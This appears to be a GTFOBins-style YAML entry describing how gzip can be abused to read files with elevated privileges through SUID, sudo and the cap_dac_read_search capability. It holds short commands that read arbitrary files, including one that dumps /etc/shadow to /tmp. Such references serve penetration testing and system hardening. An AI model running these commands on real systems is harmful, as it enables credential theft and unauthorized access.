---
description: There are also a number of other utilities that rely on `gzip` under the hood, e.g., `zless`, `zcat`, `gunzip`, etc. Besides having similar features, they also allow privileged reads if `gzip` itself is SUID.
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        gzip -f $LFILE -t
    - code: |
        LFILE=file_to_read
        gzip -c $LFILE | gzip -d
  suid:
    - code: |
        LFILE=file_to_read
        ./gzip -f $LFILE -t
  sudo:
    - code: |
        LFILE=file_to_read
        sudo gzip -f $LFILE -t
  capabilities:
    - description: If cap_dac_read_search is set. Run ``getcap -r / 2>/dev/null`` to confirm ``/usr/bin/gzip cap_dac_read_search=ep``
      code: |
        gzip can read any file:
        gzip -c /etc/shadow > /tmp/shadow.gz
        gzip -d /tmp/shadow.gz
        cat /tmp/shadow
---
